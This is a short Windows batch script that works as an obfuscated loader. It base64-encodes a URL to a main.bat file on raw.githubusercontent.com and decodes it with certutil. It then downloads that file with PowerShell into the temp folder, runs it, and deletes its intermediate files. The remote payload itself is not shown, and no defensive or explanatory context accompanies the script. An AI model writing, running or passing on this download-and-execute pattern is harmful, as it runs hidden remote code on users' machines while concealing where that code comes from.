@echo off
setlocal enabledelayedexpansion
set g0d=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldi1nMGQvZGV2LWcwZC5naXRodWIuaW8vcmVmcy9oZWFkcy9tYWluLXNpdGUvZW5jb2RlL3ZpZGVvL21haW4uYmF0
set "output=%temp%\g0dload.bat"
del "%output%" >nul 2>&1
echo !g0d!> g0d.b64
certutil -f -decode g0d.b64 g0d.txt >nul
set /p encode=<g0d.txt
set "encode=!encode!?t=%random%"
del g0d.*
set "load=!encode!"
powershell -Command "Invoke-WebRequest -Uri !load! -OutFile %output%"
call "%output%"
